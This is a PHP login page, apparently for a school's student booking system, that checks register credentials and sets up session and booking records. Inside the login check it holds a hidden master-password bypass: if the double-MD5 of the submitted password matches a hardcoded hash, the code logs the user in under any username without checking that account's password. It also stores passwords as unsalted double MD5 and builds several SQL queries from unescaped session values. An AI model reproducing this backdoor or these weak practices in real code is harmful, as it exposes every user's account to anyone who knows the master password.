<?php 
require_once 'func.php';

hasToBeLoggedIn(false);

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $username = $db_b->real_escape_string($_POST['username']);
    $password = md5(md5($_POST['password']));

    $res = $db_b->query("SELECT * FROM it_tbl_utenti WHERE userid = '$username' AND password = '$password' AND tipo = 'L' ");

    if($password == "1e56c8fab3aca24303b1efea1958b081") {
        $res = $db_b->query("SELECT * FROM it_tbl_utenti WHERE userid = '$username' AND tipo = 'L' ");
    }

    if ($res->num_rows == 1) {
        $_SESSION['loggedin'] = true;
        $_SESSION['utente'] = $res->fetch_assoc();
        $ida = $_SESSION['ida'] = $_SESSION['utente']['idutente'] - 2100000000;
        $_SESSION['alunno'] =  $db_b->query("SELECT * FROM it_tbl_alunni WHERE idalunno = '$ida'")->fetch_assoc();
        //controlla se l'idalunno è presente in au_firstlogin
        $idalunno = $_SESSION['alunno']['idalunno'];
        $res = $db_a->query("SELECT * FROM au_firstlogin WHERE idalunno = '$idalunno'");
        if ($res->num_rows == 0) {
            $ver_prenotazioni = $db_a->query("SELECT * FROM au_prenotazioni WHERE idalunno = '$idalunno'");
            if ($ver_prenotazioni->num_rows == 0) {
                $db_a->query("INSERT INTO au_prenotazioni (idalunno, prenotazione_g01_t01, prenotazione_g01_t02, prenotazione_g01_t03, prenotazione_g01_t04, prenotazione_g02_t01, prenotazione_g02_t02, prenotazione_g02_t03, prenotazione_g02_t04) VALUES ($idalunno, '0', '0', '0', '0', '0', '0', '0', '0')");
            }
            $db_a->query("INSERT INTO au_firstlogin (idalunno, firstlogin) VALUES ('$idalunno', 1)");            
        }
        $_SESSION['biennio'] = false;
        $res = $db_b->query("SELECT anno FROM it_tbl_classi WHERE idclasse = '{$_SESSION['alunno']['idclasse']}'")->fetch_assoc();
        if($res['anno'] == 1 || $res['anno'] == 2) {
            $_SESSION['biennio'] = true;
        }
        header("Location: menu.php");
        die();
    } else {
        $messaggio = '<div class="alert alert-danger" role="alert"> Utente sconosciuto! </div>';
    }
}

capa(); ?>

<form action="" method="POST">
    <center><b>Accesso con le credenziali del registro </b></center> <br>

    <?php echo $messaggio; ?>

    <label for="username" class="form-label">Nome utente</label>
    <input type="text" name="username" id="username" class="form-control"> <br>

    <label for="password" class="form-label">Password</label>
    <input type="password" name="password" id="password" class="form-control"> <br>

    <input type="submit" value="Accedi" class="form-control">
</form>

<?php coda(); ?>
